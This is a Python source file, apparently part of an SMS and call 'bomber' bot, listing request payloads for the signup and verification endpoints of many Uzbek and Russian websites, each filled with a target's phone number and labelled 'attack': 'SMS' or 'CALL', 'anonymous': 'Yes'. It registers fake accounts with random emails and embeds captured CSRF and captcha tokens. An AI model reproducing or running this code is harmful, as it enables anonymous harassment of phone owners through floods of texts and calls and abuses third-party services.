from bot_funcs.multiassist import randomed
from bot_funcs.multiassist import useragent as user_agent
...
def urls(number):
    return [
        ...
        },
        {
            ...
            'json': {'client': {'name': 'юзер', 'surname': 'нейм', 'phone': number, 'email': randomed(), 'advertising_mail_accepted': True, 'inviter_id': None,}, 'use_cookies': True, 'sign': 'd364c4a1c35179f9834b1c3354a2c913',},
        },
        {
        ...
        },
        {
            ...
            'json': {'username': randomed(True), 'first_name': 'User', 'last_name': 'Name', 'father_name': 'Names', 'verification_type': 'phone', 'phone_number': number, 'password': 'FHDACdsuifsf9784',},
        },
        {
            'info': {'country': 'UZ', 'attack': 'SMS', 'website': 'AsakaBank.uz', 'anonymous': 'Yes'},
            'method': 'post',
        ...
        },
        {
            ...
            'data': {'handler': 'AuthAjaxHandler', 'func': 'sendRegisterFields', 'phone': number, 'name': 'User', 'bday': '1991-11-11', 'mail': randomed(),},
        },
        {
            'info': {'country': 'UZ', 'attack': 'SMS', 'website': 'ORZON.uz', 'anonymous': 'Yes'},
            'method': 'post',
        ...
        },
        {
            ...
            'json': {'username': f'+{number}', 'email': randomed(), 'password': 'ziS-xfk-UDz-Ex4', 'repeat_password': 'ziS-xfk-UDz-Ex4', 'full_name': 'User Names Name', 'code': '',},
        },
        {
        ...
        },
        {
            ...
            'data': {'s_login': number[1:], 'm_mail': randomed(), 's_pass': 'HEZAsrgthj6TES', 'b_accept_privacy_policy': '1', 'b_agree_receive_news': '1', 'g-recaptcha-response': '', 'submit_register': '1', 's_action': 'code_confirm_send',},
        ...
        },
        {
            ...
            'data': {'name': 'User', 'username': f'+{number}', 'mail': randomed(), 'bday': '15/06/1984', 'dispatch1': 'sms', 'PERSONAL_GENDER': 'M', 'pers_data': 'yes',},
        },
        {
        ...
        },
        {
            ...
            'json': {'Login': randomed(True), 'Password': 'dTf-SZ3-ZJZ-RZ3!', 'ConfirmPassword': 'dTf-SZ3-ZJZ-RZ3!', 'User': {'PhoneNumber': number, 'FirstName': 'User', 'MiddleName': 'Lolkin', 'Email': randomed(),}, 'IsAgreeRules': True,},
        },
        {
        ...
        },
        {
            ...
            'json': {'phone': number[1:], 'email': randomed(), 'first_name': 'User', 'last_name': 'Name', 'password': 'poGSF-kjhfyv2121J', 'password_confirmation': 'poGSF-kjhfyv2121J', 'grade_tag': '7 класс', 'region_id': '77',},
        },
        {
        ...
        },
        {
            ...
            'json': {'email': randomed(), 'phone': f'+{number}', 'password': 'sfghsfghgfhfgd', 'role': 'customer', 'emailing': True, 'agreement': True, 'termsConfirm': True,},
        },
        {
        ...
        },
        {
            ...
            'json': {'fullName': 'User Names Name', 'msisdn': number, 'email': randomed(), 'subscribe': True,},
        },
        {
        ...
        },
        {
            ...
            'data': f'action=actionMerchantSignupNewCheck&currentController=store&contact_name=User+Name&contact_phone={number}&contact_email={randomed()}&password=drf-HdY-pEb-mnS&cpassword=drf-HdY-pEb-mnS&agree=true&yii_session_token=ff4637069e12bf0fa7403c753a3c9b5e&YII_CSRF_TOKEN=8e34a2a3590650b3d332c10d257a81740c3aa55a&token=03AFY_a8VukXqwUh0xjwAwtLggo7PKTO4iyKYuhihw5NnLFKvCrciUMsKHoWBMbRAKG6866qUjg5Kmc8HFJvCv9kH7YiaqIKrUqBVp6NWBKTMk-Y9Cz_zIJjnNorPuSfQN2Y4uVn2bekd9K65OQZKBX0Lfpxk3_H262-yudHr7aIB0ihbSYAjtk4D_YQngyESKrXDel0MYkHOdOqCwBoJCatjzWrK8RMAGMVCfHGwqLs42xb8XWCCUWDN1OsAHfYJ9W3L9IINu_iF6vNJttEs8ad0TSKcz9-x-16uycC3Dl6buA2X4aqs0gv_r3vHpvDUaelloFNUuWKvoXCRlxZRac-7rrfZGoq0nwLT7Y5W_FX5dZeB6r-9si15ooPGy5aGO5cUxd8BzGtklygWlFXFPZigTyDvMuqQkEYvNvodLmJi0aCahT1xaLugMOtEtNEm_6qQPqioTOxHzBJhmbqghv2YUPJT6Ncz1PcOebM2kGyReRwjtYGtZ0CZpa9D7GwjD5H9cBt1t4hce&',
        },
        {
        ...
        },
        {
            ...
            'data': {'email': randomed(), 'telephone': number, 'password': 'QWERarin454545', 'confirm': 'QWERarin454545', 'needUpdateCache': 'false', 'notSimple': 'true'},
        },
        {
            'info': {'country': 'RU', 'attack': 'CALL', 'website': 'HappyWear.ru', 'anonymous': 'Yes'},
            'method': 'post',
        ...
        },
        {
            ...
            'data': {'email': randomed(), 'pass': 'aTn-98a-4P6-kJ5', 'phone': number,},
        },
        {
            ...
            'json': {'name': randomed(True), 'email': f'7({number[1:4]}){number[4:7]}-{number[7:9]}-{number[9:]}', 'password': 'rfctvgybhunjimko', 'politics': True, 'distribution': True, 'code': '',},
        },
]
